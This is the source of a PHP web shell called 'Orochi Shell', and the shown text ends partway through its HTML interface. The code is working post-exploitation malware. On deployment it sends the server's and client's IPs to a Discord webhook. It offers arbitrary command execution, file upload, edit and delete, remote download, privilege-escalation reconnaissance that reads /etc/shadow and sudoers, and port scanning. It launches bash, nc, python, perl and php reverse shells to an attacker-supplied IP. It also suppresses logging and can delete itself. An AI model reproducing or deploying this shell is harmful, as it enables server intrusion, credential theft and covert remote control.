<?php
/**
 * Orochi Shell - Ali Essam - https://www.github.com/dragonked2
 *
 * A modern, secure, and feature-rich single-file web shell.
 *
 * @version 2.3.0
 * @author Gemini
 * @license MIT
 */

// --- Core Configuration ---
// It is STRONGLY recommended to change these values.
const OROCHI_PASSWORD = 'Ali313'; // Your secret password.
const OROCHI_DISCORD_WEBHOOK_URL = 'HERE YOUR DISCORD'; // Your Discord webhook URL. Leave empty to disable.
const OROCHI_DEBUG = false; // Set to true to display PHP errors. IMPORTANT: Set back to false for production.

// --- Environment Setup & Security Hardening ---
if (OROCHI_DEBUG) {
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
    error_reporting(E_ALL);
} else {
    error_reporting(0);
    @ini_set('display_errors', '0');
    @ini_set('log_errors', '0');
}
@set_time_limit(0);
if (function_exists('ob_start')) {
    @ob_start();
}

// --- Initial Access Notification ---
function orochi_initial_access_notify() {
    $lockFilePath = __DIR__ . DIRECTORY_SEPARATOR . '.' . basename(__FILE__, '.php') . '.lock';
    if (file_exists($lockFilePath) || empty(OROCHI_DISCORD_WEBHOOK_URL) || !filter_var(OROCHI_DISCORD_WEBHOOK_URL, FILTER_VALIDATE_URL)) {
        return;
    }

    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || ($_SERVER['SERVER_PORT'] ?? 80) == 443;
    $protocol = $https ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'] ?? php_uname('n');
    $uri = $_SERVER['REQUEST_URI'] ?? '/';
    $shell_url = $protocol . $host . $uri;
    $client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($host) ?? 'N/A';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'CLI or Not Provided';
    
    $access_method = 'Unknown';
    if (php_sapi_name() === 'cli') {
        $access_method = 'CLI';
    } elseif (isset($_SERVER['HTTP_USER_AGENT'])) {
        $access_method = stripos($user_agent, 'curl') !== false ? 'cURL' : 'Web Browser';
    }

    $embed = [
        'title' => '🐍 Orochi Shell Deployed!', 'type' => 'rich', 'color' => hexdec('2ecc71'),
        'description' => "A new shell has been activated. Details below:",
        'fields' => [
            ['name' => '🔗 URL', 'value' => '`' . $shell_url . '`', 'inline' => false],
            ['name' => '📂 Path', 'value' => '`' . __FILE__ . '`', 'inline' => false],
            ['name' => '💻 Server IP', 'value' => '`' . $server_ip . '`', 'inline' => true],
            ['name' => '👤 Client IP', 'value' => '`' . $client_ip . '`', 'inline' => true],
            ['name' => '⚙️ PHP Version', 'value' => '`' . phpversion() . '`', 'inline' => true],
            ['name' => '🌐 Access Method', 'value' => '`' . $access_method . '`', 'inline' => true],
            ['name' => '🕵️ User Agent', 'value' => '```' . $user_agent . '```', 'inline' => false],
        ],
        'footer' => ['text' => 'OrochiShell v2.3 @ ' . date('Y-m-d H:i:s')],
    ];

    $payload = json_encode(['embeds' => [$embed]], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    $notification_sent = false;

    if (function_exists('curl_init')) {
        $ch = curl_init(OROCHI_DISCORD_WEBHOOK_URL);
        curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $http_code >= 200 && $http_code < 300) {
            $notification_sent = true;
        }
    } 
    
    if (!$notification_sent && function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $context = stream_context_create(['http' => ['method' => 'POST', 'header' => "Content-Type: application/json\r\n", 'content' => $payload, 'ignore_errors' => true, 'timeout' => 10]]);
        @file_get_contents(OROCHI_DISCORD_WEBHOOK_URL, false, $context);
        if (isset($http_response_header) && strpos($http_response_header[0], '204') !== false) {
             $notification_sent = true;
        }
    }

    if ($notification_sent) {
        @touch($lockFilePath);
    }
}
orochi_initial_access_notify();

class OrochiShell
{
    private const SESSION_NAME = '__orochi_sec_v3';
    private const LOGIN_ATTEMPT_LIMIT = 5;
    private const LOGIN_ATTEMPT_WINDOW = 60; // seconds

    private string $passwordHash;
    private bool $isAuthenticated = false;

    public function __construct()
    {
        if (!defined('PASSWORD_ARGON2ID')) {
            http_response_code(500);
            die('Error: PHP 7.3+ with Argon2 support is required.');
        }
        $this->passwordHash = password_hash(OROCHI_PASSWORD, PASSWORD_ARGON2ID);

        if (session_status() === PHP_SESSION_NONE) {
            session_name(self::SESSION_NAME);
            session_start();
        }

        $this->checkAuthentication();
    }

    public function run(): void
    {
        if (!$this->isAuthenticated) {
            $this->renderLoginForm();
            return;
        }

        if (isset($_GET['logout'])) $this->logout();
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
            $this->handleApiRequest();
        } else {
            $this->renderLayout();
        }
    }

    private function checkAuthentication(): void
    {
        if (!empty($_SESSION['isAuthenticated'])) {
            $this->isAuthenticated = true;
            return;
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
            $_SESSION['login_attempts'] = array_filter($_SESSION['login_attempts'] ?? [], fn($ts) => (time() - $ts) < self::LOGIN_ATTEMPT_WINDOW);
            if (count($_SESSION['login_attempts']) >= self::LOGIN_ATTEMPT_LIMIT) {
                $_SESSION['login_error'] = 'Rate limit exceeded. Please wait a minute.';
                $this->redirect();
            }

            if (password_verify($_POST['password'], $this->passwordHash)) {
                unset($_SESSION['login_attempts'], $_SESSION['login_error']);
                $_SESSION['isAuthenticated'] = true;
                $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
                $this->isAuthenticated = true;
                $this->redirect();
            } else {
                $_SESSION['login_attempts'][] = time();
                $_SESSION['login_error'] = 'Invalid password.';
                $this->redirect();
            }
        }
    }

    private function logout(): void
    {
        $_SESSION = [];
        if (ini_get("session.use_cookies")) {
            $params = session_get_cookie_params();
            setcookie(session_name(), '', time() - 42000, $params["path"], $params["domain"], $params["secure"], $params["httponly"]);
        }
        session_destroy();
        $this->redirect();
    }

    private function handleApiRequest(): void
    {
        header('Content-Type: application/json');
        $action = $_POST['action'] ?? '';

        try {
            if ($action !== 'getContext' && (!isset($_POST['csrf_token']) || !isset($_SESSION['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token']))) {
                throw new Exception('Invalid session token. Please refresh the page and try again.');
            }
            
            $data = $_POST['data'] ?? [];
            $methodName = "api_" . $action;

            if (method_exists($this, $methodName)) {
                if ($action === 'downloadFile') {
                    $this->$methodName($data);
                } else {
                    $response = $this->$methodName($data);
                    echo json_encode($response);
                }
            } else {
                throw new Exception("Action '{$action}' handler not found.");
            }
        } catch (Throwable $e) {
            http_response_code(400);
            echo json_encode(['success' => false, 'message' => $e->getMessage(), 'trace' => OROCHI_DEBUG ? $e->getTraceAsString() : null]);
        }
        exit;
    }

    // --- API Methods ---

    private function api_getContext(): array
    {
        $disabledFuncs = @ini_get('disable_functions');
        return [
            'success' => true,
            'data' => [
                'user' => $this->getShellUser(), 'hostname' => php_uname('n'),
                'initialPath' => $this->getInitialPath(), 'csrfToken' => $_SESSION['csrf_token'],
                'systemInfo' => [
                    'OS' => php_uname(), 'PHP Version' => phpversion(),
                    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A', 'Server IP' => $_SERVER['SERVER_ADDR'] ?? gethostbyname(php_uname('n')),
                    'Root Path' => $this->getInitialPath(), 'Free Space' => $this->formatSize(@disk_free_space($this->getInitialPath())),
                    'Disabled Functions' => $disabledFuncs ? wordwrap($disabledFuncs, 60, "\n", true) : 'None'
                ]
            ]
        ];
    }
    
    private function api_listDirectory(array $data): array
    {
        $currentPath = realpath($data['path']);
        if ($currentPath === false || !is_readable($currentPath)) {
            throw new Exception("Path not found or not readable: " . htmlspecialchars($data['path']));
        }
        $files = $folders = [];
        $scannedItems = @scandir($currentPath);
        if ($scannedItems === false) {
            throw new Exception("Cannot read directory: " . htmlspecialchars($currentPath));
        }
        foreach ($scannedItems as $item) {
            if ($item === '.') continue;
            $fullPath = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
            if (!@is_readable($fullPath)) continue;
            $perms = @fileperms($fullPath);
            $info = [ 'name' => htmlspecialchars($item), 'path' => $fullPath, 'perms_human' => $this->formatPerms($perms), 'perms_octal' => substr(sprintf('%o', $perms), -4), 'modified' => date("Y-m-d H:i:s", @filemtime($fullPath)), 'owner' => $this->getItemOwner($fullPath), ];
            if (is_dir($fullPath)) {
                $info['type'] = 'folder'; $info['icon'] = 'fa-solid fa-folder-tree'; $info['size'] = '—';
                $folders[] = $info;
            } else {
                $info['type'] = 'file'; $info['icon'] = $this->getFileIcon($item); $info['size'] = $this->formatSize(@filesize($fullPath));
                $files[] = $info;
            }
        }
        return ['success' => true, 'clickablePath' => $this->generateClickablePath($currentPath), 'files' => $files, 'folders' => $folders];
    }

    private function api_getFileContent(array $data): array
    {
        $filePath = $data['item'];
        if (!is_file($filePath) || !is_readable($filePath)) throw new Exception('File not found or not readable.');
        return ['success' => true, 'content' => file_get_contents($filePath)];
    }

    private function api_saveFileContent(array $data): array
    {
        $filePath = $data['item'];
        if (!is_writable(dirname($filePath)) || (file_exists($filePath) && !is_writable($filePath))) throw new Exception('Permission denied to write to file.');
        if (@file_put_contents($filePath, $data['content']) === false) throw new Exception('Failed to save file.');
        return ['success' => true, 'message' => 'File saved successfully.'];
    }

    private function api_renameItem(array $data): array
    {
        $oldPath = $data['oldName']; $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $data['newName'];
        if (!file_exists($oldPath) || file_exists($newPath) || !@rename($oldPath, $newPath)) throw new Exception('Rename failed. Check name and permissions.');
        return ['success' => true, 'message' => 'Item renamed successfully.'];
    }

    private function api_deleteItem(array $data): array
    {
        $fullPath = $data['item'];
        if (!file_exists($fullPath)) throw new Exception('Item not found.');
        $success = is_dir($fullPath) ? $this->recursiveDelete($fullPath) : @unlink($fullPath);
        if (!$success) throw new Exception('Delete failed. Check permissions.');
        return ['success' => true, 'message' => 'Item deleted successfully.'];
    }

    private function api_uploadFiles(array $data): array
    {
        if (empty($_FILES['fileToUpload'])) throw new Exception('No files were uploaded.');
        if (!is_writable($data['path'])) throw new Exception('Upload directory is not writable.');
        $uploadedCount = 0;
        $file_ary = $this->reArrayFiles($_FILES['fileToUpload']);
        foreach ($file_ary as $file) {
            if ($file['error'] !== UPLOAD_ERR_OK) continue;
            if (@move_uploaded_file($file['tmp_name'], $data['path'] . DIRECTORY_SEPARATOR . basename($file['name']))) $uploadedCount++;
        }
        if ($uploadedCount === 0) throw new Exception('Upload failed for all files.');
        return ['success' => true, 'message' => "Successfully uploaded {$uploadedCount} file(s)."];
    }

    private function api_executeCommand(array $data): array
    {
        $command = $data['command'];
        if (empty($command)) throw new Exception('Command cannot be empty.');
        $output = $this->runCommand($command, $data['path']);
        return ['success' => true, 'output' => htmlspecialchars($output)];
    }

    private function api_createItem(array $data): array
    {
        $fullPath = $data['path'] . DIRECTORY_SEPARATOR . $data['name'];
        if (file_exists($fullPath)) throw new Exception('Item already exists.');
        if (!is_writable($data['path'])) throw new Exception('Directory is not writable.');
        $success = ($data['type'] === 'file') ? @touch($fullPath) : @mkdir($fullPath, 0755, true);
        if (!$success) throw new Exception('Creation failed. Check permissions.');
        return ['success' => true, 'message' => ucfirst($data['type']) . ' created successfully.'];
    }

    private function api_remoteDownload(array $data): array
    {
        $url = filter_var($data['url'], FILTER_VALIDATE_URL);
        if ($url === false) throw new Exception('Invalid URL provided.');
        $filename = basename(parse_url($url, PHP_URL_PATH)) ?: 'downloaded_file_' . time();
        $destination = $data['path'] . DIRECTORY_SEPARATOR . $filename;
        if (!is_writable($data['path'])) throw new Exception('Download directory is not writable.');
        if (!@copy($url, $destination)) throw new Exception('Remote download failed. Check URL and permissions.');
        return ['success' => true, 'message' => "File downloaded as {$filename}"];
    }

    private function api_chmodItem(array $data): array
    {
        $path = $data['item']; $perms = intval($data['perms'], 8);
        if (!file_exists($path)) throw new Exception('Item not found.');
        if(!@chmod($path, $perms)) throw new Exception('Could not change permissions. Check ownership and permissions.');
        return ['success' => true, 'message' => 'Permissions changed successfully.'];
    }

    private function api_selfDestruct(array $data): array
    {
        $lockFile = __DIR__ . DIRECTORY_SEPARATOR . '.' . basename(__FILE__, '.php') . '.lock';
        @unlink($lockFile);
        if (!@unlink(__FILE__)) throw new Exception('Self-destruct failed. Check script permissions.');
        return ['success' => true, 'message' => 'Shell has been removed. Goodbye.'];
    }

    private function api_downloadFile(array $data)
    {
        $filePath = $data['item'];
        if (!is_file($filePath) || !is_readable($filePath)) { http_response_code(404); exit("File not found."); }
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Content-Length: ' . @filesize($filePath));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        @readfile($filePath);
        exit;
    }

    private function api_getSystemEnum(): array
    {
        $results = [];
        $commands = [ 'System Info' => 'uname -a', 'Release Info' => 'cat /etc/*-release', 'Running Processes' => 'ps aux', 'Network Config' => 'ifconfig -a || ip a', 'Network Connections' => 'netstat -antup', 'Disk Usage' => 'df -h', 'CPU Info' => 'lscpu || cat /proc/cpuinfo', 'Memory Info' => 'free -h || cat /proc/meminfo', 'Block Devices' => 'lsblk', 'Firewall Rules (iptables)' => 'iptables -L -n -v', 'Firewall Rules (ufw)' => 'ufw status numbered', ];
        foreach ($commands as $title => $cmd) $results[$title] = $this->runCommand($cmd);
        return ['success' => true, 'data' => $results];
    }

    private function api_getPrivescInfo(): array
    {
        $results = [];
        $commands = [ 'SUID Binaries' => 'find / -perm -u=s -type f 2>/dev/null', 'GUID Binaries' => 'find / -perm -g=s -type f 2>/dev/null', 'World Writable Dirs' => 'find / -type d -perm -o+w 2>/dev/null', 'World Writable Files' => 'find / -type f -perm -o+w 2>/dev/null', 'Writable /etc/passwd' => 'ls -la /etc/passwd', 'Writable /etc/shadow' => 'ls -la /etc/shadow', 'Cron Jobs (System)' => 'ls -la /etc/cron*', 'Cron Jobs (User)' => 'crontab -l', 'Sudo Permissions' => 'sudo -ln', ];
        $files = ['/etc/passwd' => 'passwd file', '/etc/shadow' => 'shadow file (if readable)', '/etc/sudoers' => 'sudoers file (if readable)'];
        foreach ($commands as $title => $cmd) $results[$title] = $this->runCommand($cmd);
        foreach ($files as $path => $desc) if (is_readable($path)) $results["Readable {$desc}"] = htmlspecialchars(@file_get_contents($path));
        return ['success' => true, 'data' => $results];
    }

    private function api_networkScan(array $data): array
    {
        $host = $data['host']; $portsStr = $data['ports']; $timeout = 0.5; $ports = [];
        foreach (explode(',', $portsStr) as $portRange) {
            $range = explode('-', $portRange);
            if (count($range) == 2 && is_numeric($range[0]) && is_numeric($range[1])) {
                for ($p = (int)$range[0]; $p <= (int)$range[1]; $p++) $ports[] = $p;
            } elseif (is_numeric($range[0])) {
                $ports[] = (int)$range[0];
            }
        }
        $ports = array_unique($ports);
        $results = [];
        foreach ($ports as $port) {
            $connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
            if (is_resource($connection)) {
                $results[$port] = 'Open';
                fclose($connection);
            } else {
                $results[$port] = 'Closed';
            }
        }
        return ['success' => true, 'data' => $results];
    }

    private function api_reverseShell(array $data): array
    {
        $ip = $data['ip']; $port = (int)$data['port'];
        if (filter_var($ip, FILTER_VALIDATE_IP) === false) throw new Exception("Invalid IP address");
        if ($port <= 0 || $port > 65535) throw new Exception("Invalid port number");
        $shells = [ 'bash' => "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1", 'nc' => "nc -e /bin/sh {$ip} {$port}", 'php' => "php -r '\$sock=fsockopen(\"{$ip}\",{$port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", 'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", 'perl' => "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ];
        $log = [];
        foreach ($shells as $type => $cmd) {
            $this->runCommand($cmd . " > /dev/null 2>&1 &");
            $log[] = "Attempted {$type} reverse shell to {$ip}:{$port}. Check your listener.";
        }
        return ['success' => true, 'message' => 'Reverse shell attempts initiated.', 'log' => $log];
    }

    // --- Helper & Utility Methods ---

    private function getInitialPath(): string { return __DIR__; }

    private function redirect(string $location = null): void
    {
        header("Location: " . ($location ?? $_SERVER['PHP_SELF']));
        exit;
    }
    
    private function runCommand(string $command, string $cwd = null): string
    {
        $cwd = $cwd ?? $this->getInitialPath();
        $fullCmd = "cd " . escapeshellarg($cwd) . " && " . $command;

        if ($this->isFuncEnabled('proc_open')) {
            $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
            $process = @proc_open($fullCmd, $descriptors, $pipes, $cwd);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                $error = stream_get_contents($pipes[2]);
                fclose($pipes[1]); fclose($pipes[2]); proc_close($process);
                return $output . $error;
            }
        }
        if ($this->isFuncEnabled('shell_exec')) return @shell_exec($fullCmd . " 2>&1");
        if ($this->isFuncEnabled('exec')) { @exec($fullCmd . " 2>&1", $o); return implode("\n", $o); }
        if ($this->isFuncEnabled('passthru')) { ob_start(); @passthru($fullCmd . " 2>&1"); return ob_get_clean(); }
        return 'No available command execution functions.';
    }

    private function getShellUser(): string
    {
        if ($this->isFuncEnabled('posix_getpwuid') && $this->isFuncEnabled('posix_geteuid')) {
            $userInfo = @posix_getpwuid(@posix_geteuid());
            return $userInfo['name'] ?? 'N/A';
        }
        return trim($this->runCommand('whoami'));
    }
    
    private function getItemOwner(string $path): string
    {
        if (function_exists('posix_getpwuid')) return (@posix_getpwuid(@fileowner($path)))['name'] ?? 'N/A';
        return 'N/A';
    }

    private function formatPerms(int $perms): string
    {
        $info  = (($perms & 0xC000) === 0xC000) ? 's' : ((($perms & 0xA000) === 0xA000) ? 'l' : ((($perms & 0x8000) === 0x8000) ? '-' : ((($perms & 0x6000) === 0x6000) ? 'b' : ((($perms & 0x4000) === 0x4000) ? 'd' : ((($perms & 0x2000) === 0x2000) ? 'c' : ((($perms & 0x1000) === 0x1000) ? 'p' : '-'))))));
        $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
        $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
        $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
        return $info;
    }

    private function formatSize($bytes): string
    {
        if (!is_numeric($bytes) || $bytes < 0) return 'N/A';
        if ($bytes === 0) return '0 B';
        $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
        $power = ($bytes > 0) ? floor(log($bytes, 1024)) : 0;
        return round($bytes / (1024 ** $power), 2) . ' ' . $units[$power];
    }

    private function getFileIcon(string $file): string
    {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        $icons = ['html' => 'fa-brands fa-html5', 'php' => 'fa-brands fa-php', 'css' => 'fa-brands fa-css3-alt', 'js' => 'fa-brands fa-js-square', 'py' => 'fa-brands fa-python', 'json' => 'fa-solid fa-file-code', 'md' => 'fa-brands fa-markdown', 'txt' => 'fa-regular fa-file-lines', 'zip' => 'fa-solid fa-file-zipper', 'rar' => 'fa-solid fa-file-zipper', 'tar' => 'fa-solid fa-file-zipper', 'gz' => 'fa-solid fa-file-zipper', 'jpg' => 'fa-regular fa-image', 'jpeg' => 'fa-regular fa-image', 'png' => 'fa-regular fa-image', 'gif' => 'fa-regular fa-image', 'svg' => 'fa-regular fa-image', 'mp3' => 'fa-solid fa-music', 'mp4' => 'fa-solid fa-film', 'sh' => 'fa-solid fa-terminal', 'c' => 'fa-solid fa-file-code', 'cpp' => 'fa-solid fa-file-code', 'sql' => 'fa-solid fa-database', 'db' => 'fa-solid fa-database'];
        return $icons[$ext] ?? 'fa-regular fa-file';
    }

    private function generateClickablePath(string $fullPath): string
    {
        $fullPath = rtrim(str_replace(DIRECTORY_SEPARATOR, '/', $fullPath), '/');
        if ($fullPath === '') return '<a href="#" class="path-part" data-path="/">/</a>';
        $parts = explode('/', $fullPath);
        $html = ''; $currentPath = '';
        
        foreach ($parts as $i => $part) {
            if (empty($part) && $i === 0) {
                 $html .= '<a href="#" class="path-part" data-path="/">/</a>';
                 $currentPath = '/';
                 continue;
            }
            if ($currentPath === '/') $currentPath = '';
            $currentPath .= '/' . $part;
            $html .= '<span class="text-muted px-1">/</span><a href="#" class="path-part" data-path="' . htmlspecialchars($currentPath) . '">' . htmlspecialchars($part) . '</a>';
        }
        return $html;
    }

    private function recursiveDelete(string $dirPath): bool
    {
        if (!is_dir($dirPath)) return false;
        try {
            $items = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($items as $item) {
                if ($item->isDir()) @rmdir($item->getRealPath());
                else @unlink($item->getRealPath());
            }
            return @rmdir($dirPath);
        } catch (Throwable $e) { return false; }
    }

    private function reArrayFiles(array &$file_post): array
    {
        $file_ary = []; $file_count = is_array($file_post['name']) ? count($file_post['name']) : 1; $file_keys = array_keys($file_post);
        for ($i=0; $i<$file_count; $i++) foreach ($file_keys as $key) $file_ary[$i][$key] = is_array($file_post[$key]) ? $file_post[$key][$i] : $file_post[$key];
        return $file_ary;
    }

    private function isFuncEnabled(string $funcName): bool
    {
        if (!function_exists($funcName)) return false;
        $disabled = @ini_get('disable_functions');
        if ($disabled === false || $disabled === '') return true;
        return !in_array($funcName, array_map('trim', explode(',', $disabled)));
    }
    
    // --- UI Rendering Methods ---

    private function renderLoginForm(): void
    {
        $error_message = '';
        if (!empty($_SESSION['login_error'])) {
            $error_html = htmlspecialchars($_SESSION['login_error']);
            $error_message = "<div class='login-error'>{$error_html}</div>";
            unset($_SESSION['login_error']);
        }
        echo <<<HTML
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Authentication Required</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet"><style>body,html{height:100%;margin:0;font-family:'Roboto Mono',monospace;background-color:#121212;color:#E0E0E0;display:flex;justify-content:center;align-items:center;} .login-container{background:#1E1E1E;padding:40px;border-radius:8px;box-shadow:0 0 35px rgba(76,175,80,0.2);text-align:center;width:90%;max-width:400px;border:1px solid #333;} h2{margin-bottom:20px;color:#4CAF50;font-weight:700;letter-spacing:3px;text-transform:uppercase;} input[type="password"]{font-family:inherit;background-color:#121212;border:1px solid #333;color:#E0E0E0;padding:12px;width:calc(100% - 24px);margin-bottom:20px;border-radius:4px;transition:all 0.3s ease;} input:focus{outline:none;border-color:#4CAF50;box-shadow:0 0 10px rgba(76,175,80,0.5);} button{font-family:inherit;background-color:#4CAF50;color:#FFFFFF;border:none;padding:12px 20px;cursor:pointer;font-weight:700;text-transform:uppercase;border-radius:4px;width:100%;transition:all .3s ease;letter-spacing:1px;} button:hover{background-color:#5cb85c;box-shadow:0 0 15px rgba(76,175,80,0.7);} .login-error{color:#f44336;background-color:rgba(244,67,54,0.1);border:1px solid #f44336;padding:10px;margin-bottom:20px;border-radius:4px;text-align:left;}</style></head><body><div class="login-container"><h2><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-4px;margin-right:8px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>Orochi Auth</h2>{$error_message}<form method="POST"><input type="password" name="password" placeholder="PASSWORD" required autofocus><button type="submit">Authenticate</button></form></div></body></html>
HTML;
    }

    private function renderLayout(): void
    {
        echo <<<'OROCHI_HTML_LAYOUT'
<!DOCTYPE html><html lang="en" data-bs-theme="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Orochi Shell v2.3</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"><link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500&family=Orbitron:wght@700&display=swap" rel="stylesheet"><style>:root{--theme-primary:#00ff8c;--theme-secondary:#9c27b0;--theme-accent:#ffc107;--bs-dark-rgb:18,18,18;--bs-body-bg:#121212;--bs-tertiary-bg:#1e1e1e;--bs-border-color-translucent:rgba(255,255,255,0.1);--bs-primary-rgb:0,255,140;--bs-primary:#00ff8c;}body{font-family:'Roboto Mono',monospace;}.card,.modal-content{background-color:var(--bs-tertiary-bg);box-shadow:0 4px 8px rgba(0,0,0,0.2);border:1px solid var(--bs-border-color-translucent)}.card-header{background-color:rgba(0,0,0,0.2);color:var(--theme-primary);font-family:'Orbitron',sans-serif;text-transform:uppercase;letter-spacing:1px;}.table-hover>tbody>tr:hover>*{--bs-table-hover-bg:rgba(0,255,140,0.07)}.btn-outline-primary{--bs-btn-color:var(--theme-primary);--bs-btn-border-color:var(--theme-primary);--bs-btn-hover-bg:var(--theme-primary);--bs-btn-hover-color:#000;--bs-btn-active-bg:var(--theme-primary);}.btn-outline-danger{--bs-btn-hover-color:#fff;}.form-control,.form-select{background-color:#121212;}.form-control:focus,.form-select:focus{background-color:#121212;border-color:var(--theme-primary);box-shadow:0 0 0 .25rem rgba(var(--bs-primary-rgb),.25)}.terminal-output,#scan-results,#revshell-log{background-color:#0A0A0A;font-size:0.9em;white-space:pre-wrap;word-wrap:break-word;overflow-y:auto;border:1px solid var(--bs-border-color-translucent);height:calc(100% - 40px)}.clickable-path-container{background-color:rgba(0,0,0,0.2);padding:.5rem .75rem;border-radius:.25rem;word-break:break-all;}.clickable-path-container a{color:var(--bs-body-color);text-decoration:none}.clickable-path-container a:hover{color:var(--theme-primary)}.action-icon{cursor:pointer;transition:color 0.2s ease}.action-icon:hover{color:var(--theme-accent)}.toast{background-color:var(--bs-tertiary-bg)!important;border:1px solid var(--bs-border-color-translucent)}.nav-tabs .nav-link.active{background:var(--bs-tertiary-bg);color:var(--theme-primary);border-color:var(--bs-border-color-translucent) var(--bs-border-color-translucent) var(--bs-tertiary-bg)}.accordion-button{background-color:rgba(0,0,0,0.2)!important;color:var(--bs-body-color)!important}.accordion-button:not(.collapsed){color:var(--theme-primary)!important;box-shadow:inset 0 calc(-1 * var(--bs-accordion-border-width)) 0 var(--bs-accordion-border-color)}.accordion-button:focus{box-shadow:0 0 0 .25rem rgba(var(--bs-primary-rgb),.25);}</style></head><body class="bg-dark"><div class="container-fluid py-3"><div class="d-flex justify-content-between align-items-center mb-3"><h3 class="m-0" style="font-family:'Orbitron',sans-serif;color:var(--theme-primary);"><i class="fa-solid fa-user-secret me-2"></i>OROCHI v2.3</h3><div class="ms-auto d-flex align-items-center"><button id="btn-tools" class="btn btn-sm btn-outline-primary me-2"><i class="fa-solid fa-toolbox"></i> Tools</button><button id="btn-create" class="btn btn-sm btn-outline-primary me-2"><i class="fa-solid fa-plus"></i> New</button><button id="btn-upload" class="btn btn-sm btn-outline-primary me-2"><i class="fa-solid fa-upload"></i> Upload</button><a href="?logout=1" class="btn btn-sm btn-outline-danger"><i class="fa-solid fa-right-from-bracket"></i></a></div></div><div id="toast-container" class="position-fixed top-0 end-0 p-3" style="z-index:9999"></div><div class="row"><div class="col-lg-4 mb-3"><div class="card h-100"><div class="card-header"><i class="fa-solid fa-circle-info me-2"></i>System Info</div><div class="card-body" id="system-info-body" style="font-size:.85rem;overflow-wrap:break-word;"><div class="d-flex justify-content-center align-items-center h-100"><div class="spinner-border text-primary" role="status"></div></div></div></div></div><div class="col-lg-8 mb-3"><div class="card h-100"><div class="card-header"><i class="fa-solid fa-terminal me-2"></i>Command Execution</div><div class="card-body d-flex flex-column p-2"><form id="cmd-form" class="mb-2"><div class="input-group"><span id="terminal-prompt" class="input-group-text bg-dark border-secondary"></span><input type="text" id="cmd-input" class="form-control" autocomplete="off" autofocus><button class="btn btn-outline-primary" type="submit">Run</button></div></form><div id="terminal-output" class="terminal-output p-2 rounded 